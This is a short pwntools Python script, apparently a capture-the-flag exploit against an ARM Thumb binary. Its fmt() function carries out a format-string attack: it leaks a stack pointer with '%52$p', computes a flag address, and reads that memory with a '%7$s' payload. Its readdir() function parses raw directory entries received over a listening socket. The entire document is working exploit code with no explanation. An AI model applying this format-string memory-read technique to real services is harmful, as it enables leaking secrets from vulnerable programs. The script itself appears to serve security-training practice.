from pwn import *
import time
import sys

context.arch = "thumb"
def fmt():
	r = listen(1337)
	payload = "%52$p---"
	r.sendline(payload)
	flagaddr = int(r.recvuntil("---")[:-3],16) + 0x78
	# print hex(flagaddr)
	payload = "%7$s"
	payload = payload.ljust(8,"X")
	payload += p32(flagaddr)
	r.sendline(payload)

	r.interactive()

def readdir():
	dtypes = {}
	dtypes["\x04"] = "DT_DIR"
	dtypes["\x0a"] = "DT_LNK"
	dtypes["\x08"] = "DT_REG"
	
	r = listen(1337)
	data = r.recvuntil("---")
	bpos = 0
	while 1:
		ino = u32(data[bpos:bpos+4])
		off_t = u32(data[bpos+4:bpos+8])
		idx = data.find("\x00",bpos+10)
		if bpos+10==idx:
			break
		d_reclen = u16(data[bpos+8:bpos+10])
		d_type = data[bpos+d_reclen-1]
		log.info("%s\t%s" % (data[bpos+10:idx],dtypes[d_type]))
		bpos += d_reclen

readdir()
fmt()